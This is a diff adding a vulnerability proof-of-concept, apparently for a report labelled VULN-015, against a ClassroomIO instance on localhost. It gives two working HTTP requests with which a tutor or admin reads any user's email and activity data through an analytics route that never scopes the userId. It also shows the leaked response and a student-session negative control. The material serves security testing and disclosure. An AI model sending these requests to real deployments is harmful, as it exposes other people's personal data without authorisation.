@@ -1,0 +1,27 @@
+### VULN-015 — Arbitrary-user PII oracle via analytics (path :userId never scoped to caller)
+### Caller is a team member of ONE org/course (admin qualifies; a TUTOR passes the identical gate).
+### <S> is the caller's session cookie. <VID> is a victim userId that is NOT a member of the caller's
+### org/course (here a freshly-created account with orgRoles={}).
+
+### Variant A — organization audience analytics (gate: orgTeamMemberMiddleware = ADMIN|TUTOR)
+GET http://localhost:21527/organization/audience/62bb4e92-7643-4722-acc8-0834bcef9412/analytics HTTP/1.1
+Host: localhost:21527
+Origin: http://localhost:21526
+cio-org-id: 48bbdff8-2ad5-46a3-a259-2ca3d52677dd
+Cookie: classroomio.session_token=<S>
+
+### Variant B — course members analytics (gate: courseTeamMemberMiddleware = course team | org admin)
+GET http://localhost:21527/course/b558073b-ff39-42bf-8ed0-cb98dab1b2a1/members/62bb4e92-7643-4722-acc8-0834bcef9412/analytics HTTP/1.1
+Host: localhost:21527
+Origin: http://localhost:21526
+cio-org-id: 48bbdff8-2ad5-46a3-a259-2ca3d52677dd
+Cookie: classroomio.session_token=<S>
+
+### Both responses: HTTP 200
+### { "success": true, "data": { "user": {
+###     "id": "62bb4e92-...", "fullName": "u_fb6cb3ef",
+###     "email": "u_fb6cb3ef@cvehunt.local",   <-- arbitrary user's email, though not a member
+###     "avatarUrl": "", "lastSeen": "2026-09-27T07:59:43.302Z" }, ... } }
+###
+### Negative control: the same request from a STUDENT session -> HTTP 403 (students are not team members),
+### confirming the route IS gated — the defect is the unconstrained :userId, reachable by any TUTOR/ADMIN.
